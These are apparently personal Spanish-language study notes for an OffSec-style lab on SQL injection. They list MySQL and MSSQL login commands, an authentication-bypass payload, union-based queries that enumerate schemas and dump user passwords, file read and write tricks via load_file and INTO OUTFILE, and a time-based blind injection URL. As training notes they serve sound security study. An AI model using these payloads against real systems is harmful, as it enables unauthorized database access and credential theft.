
## DESCRIPTION

Para conectarnos a una BBDD MySQL:

```
mysql -u root -p'root' -h 192.168.196.16 -P 3306 
```

Para conectaqrnos a una MSSQL:

```
mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

Enumeracion:

![[Pasted image 20230703160925.png]]
Primero a probar:

```
offsec' OR 1=1 -- //
```

La consulta quedaría:

```
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
```
#### Mas información
* https://www.youtube.com/watch?v=C-FiImhUviM&ab_channel=S4viOnLive%28BackupDirectosdeTwitch%29
* https://portswigger.net/web-security/sql-injection
* Util para diferentes BBDD: https://portswigger.net/web-security/sql-injection/cheat-sheet

## EXPLOITATION

### OPTION 1: UNION-BASED

Ejemplos:

```
' UNION SELECT database(), user(), @@version, null, null -- //

' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

' UNION SELECT null, username, password, description, null FROM users -- //
```

Procedimiento:

1º Buscar numero de columnas (si da error es qeu no hay esas columnas)

```
' order by 3;-- -'
```

MEJOR OPCIÓN: Tambien se puede usar lo siguiente, para ver donde se representan cada columna

```
' union select 1,2,3
```

![[Pasted image 20230509181201.png]]

OTRAS DIRECTIVAS:

Para escribir un fichero: `' union select "" into outfile 

Para concatenar columnas: ` group_concat()`

2º VER las bases de datos

```
' schema_name .... from information_schema.schemata
```

Si solo vemos una linea, podemos hacer agrupaciones con limit 0,1 ->1,1 ->1.2

Llegados hasta aqui tenemos que ir enumerando tablas, columnas y datos

3º Listar tablas

```
' union <<>> table_name <<>> from information_schema.tables where table_schema='x'
```

**!!NOTA IMPORTANTE!!** Se le puede añadir limit para hacer agrupaciones

4º Listar columnas

```
#MEJOR OPCIÓN
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

... colum:name ... from information_schema.columns where table_schema='X' and table_name='x'
```

5º Otras Queries SQL interesantes:

* database(): muestra la database utilizada
* version(): muestra la version de la bbdd MySQL accepts both _version()_ and _@@version_ statements.

```
' UNION SELECT null, username, password, description, null FROM users -- //

' or 1=1 in (select @@version) -- //
```
* user(): muestra el usuario que está corriendo la bbdd
* load_file("file"): muestra un fichero de la maquina (/etc/passwd)

**!!NOTA IMPORTANTE!!** 
* Puede que de algun problemita en la cadena, probar a ponerlo en decimal: Oxloquesea


### OPTION 1: TIME-BASED

![[Pasted image 20230502114042.png]]

Ejemplo de time-based (sería similar al ' and 1=1 -- //)

```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 